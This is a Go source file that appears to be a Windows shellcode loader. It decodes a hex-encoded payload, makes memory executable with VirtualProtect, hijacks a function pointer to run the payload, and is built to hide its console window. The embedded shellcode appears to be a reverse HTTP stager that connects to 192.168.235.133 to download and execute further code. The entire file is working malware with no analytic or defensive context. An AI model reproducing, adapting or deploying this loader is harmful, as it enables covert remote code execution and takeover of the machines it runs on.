package main

import (
	"encoding/hex"
	"log"
	"os"
	"syscall"
	"unsafe"
)

func main() {
	// go build -ldflags "-H windowsgui" -o bc.exe
	var (
		shellcode = "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8500000004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f4f4c566c0021840910fcbe3003da4d14771494459555d2b703e8277e6dbc527700cb0cd896a7a620880468515e028e9022d5598339758e34397114369a35976ef959c022a914d480274fd42718e100557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d5349452031302e303b2057696e646f7773204e5420362e323b2057696e36343b207836343b2054726964656e742f362e303b204d4141524a53290d0a002893b8bce78eb0bd65bce1980ce54e67986acf3a3297961a573706b191e5ddc4a01f229de058a10de41a2d793a0c5be079951a4cb5d52665e30d7831b13df8e2474169c1bfd3b5a24093f84dd72c017a2493ede273aeab16d0555a376eafc830df0495bb0876d6bbbd1bb1ec2c83dce2eb8421d028a7f7ae681800e2cfdea6b170d4dd6790b169b41044e9e7dc937809e339fc27e063e8ef6ba27e2d567f7450724fd035f8b38e01ae72cef962aa05b21d44e5ec6a3ab1e67e6c6668ed251d36c2e480179c1b01a4f33f35ee0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e3233352e313333001969a08d"
	)
	sc, err := hex.DecodeString(shellcode)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
	Inject(sc)
}

func Inject(sc []byte) {
	VirtualProtect :=func(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool{
		ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect").Call(
			uintptr(lpAddress),
			uintptr(dwSize),
			uintptr(flNewProtect),
			uintptr(lpflOldProtect))
		return ret > 0
	}
	exec := func() {}
	var shellgode uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&exec))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&shellgode)) {
		panic("Error")
	}

	**(**uintptr)(unsafe.Pointer(&exec)) = *(*uintptr)(unsafe.Pointer(&sc))

	var shellgod uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&shellgod)) {
		panic("Error")
	}
	exec()
}

